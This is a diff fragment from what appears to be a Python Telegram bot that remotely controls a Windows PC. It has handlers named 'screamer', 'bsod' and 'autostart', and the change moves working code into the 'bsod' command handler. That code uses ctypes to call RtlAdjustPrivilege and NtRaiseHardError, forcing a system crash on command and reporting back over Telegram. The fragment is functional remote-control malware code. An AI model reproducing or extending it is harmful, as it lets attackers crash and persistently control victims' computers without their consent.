@@ -54,24 +54,24 @@ def send_screamer(command) :
 @bot.message_handler(commands=['bsod', 'Bsod']) 
 def send_bsod(command) :
     bot.send_message(chat_id, "Wait...") 
+    
+    nullptr = POINTER(c_int)() 
+    windll.ntdll.RtlAdjustPrivilege( 
+        c_uint(19), 
+        c_uint(1), 
+        c_uint(0), 
+        byref(c_int()) 
+    )  
+    windll.ntdll.NtRaiseHardError( 
+        c_ulong(0xC000007B), 
+        c_ulong(0), 
+        nullptr, 
+        nullptr, 
+        c_uint(6), 
+        byref(c_uint()) 
+    )
 
-nullptr = POINTER(c_int)() 
-windll.ntdll.RtlAdjustPrivilege( 
-    c_uint(19), 
-    c_uint(1), 
-    c_uint(0), 
-    byref(c_int()) 
-) 
-windll.ntdll.NtRaiseHardError( 
-    c_ulong(0xC000007B), 
-    c_ulong(0), 
-    nullptr, 
-    nullptr, 
-    c_uint(6), 
-    byref(c_uint()) 
-)
-
-bot.send_message(chat_id, "Successfully bsod!") 
+    bot.send_message(chat_id, "Successfully open bsod") 
 
 @bot.message_handler(commands=['autostart', 'Autostart']) 
 def send_autostart(command) :
